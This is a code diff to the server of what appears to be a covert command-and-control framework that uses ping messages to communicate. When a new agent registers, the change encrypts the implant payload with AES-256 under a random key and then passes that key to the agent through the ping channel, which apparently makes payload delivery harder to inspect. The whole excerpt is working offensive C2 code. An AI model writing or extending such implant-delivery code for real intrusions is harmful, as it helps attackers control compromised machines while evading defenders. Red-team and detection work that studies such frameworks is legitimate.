@@ -1,6 +1,6 @@
 use crate::{environment, patcher, workers::session, CHANNEL, GLOBAL_CONF, KEY, SESSIONS};
 use covert_c2_ping_common::{
-    ClientConfig, DeleteAgent, NewAgent, PatchAgent, PingMessage, SessionData,
+    ClientConfig, DeleteAgent, NewAgent, PatchAgent, PingMessage, SessionData, KEY_SIZE,
 };
 use std::{
     collections::HashMap,
@@ -9,6 +9,8 @@ use std::{
 };
 use tokio::task;
 use warp::{http::Response, Filter, Rejection, Reply};
+use aes::cipher::{block_padding::Pkcs7, BlockEncrypt};
+use aes::cipher::{BlockEncryptMut, KeyInit};
 
 pub async fn worker() {
     let patch = warp::patch()
@@ -37,14 +39,20 @@ async fn post_agent(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
         covert_server::start_implant_session(&GLOBAL_CONF.ts, &new_agent.arch, &new_agent.pipe)
             .await
             .or(Err(warp::reject::reject()))?;
-
     tracing::info!("Got payload len:{}", payload.len());
+
+    let payload_key: [u8; KEY_SIZE] = rand::random();
+    let encryptor = aes::Aes256Enc::new_from_slice(&payload_key).or(Err(warp::reject::reject()))?;
+    let payload = encryptor.encrypt_padded_vec_mut::<Pkcs7>(&payload);
+
     let id: u16 = AGENT_COUNT.fetch_add(1, Ordering::SeqCst);
     task::spawn(session::worker(
         connection,
         id,
         new_agent.arch.clone(),
     ));
+
+    CHANNEL.lock().await.put_message(PingMessage::KeyMessage(payload_key), id);
 
     let req_conf: ClientConfig = ClientConfig {
         id,
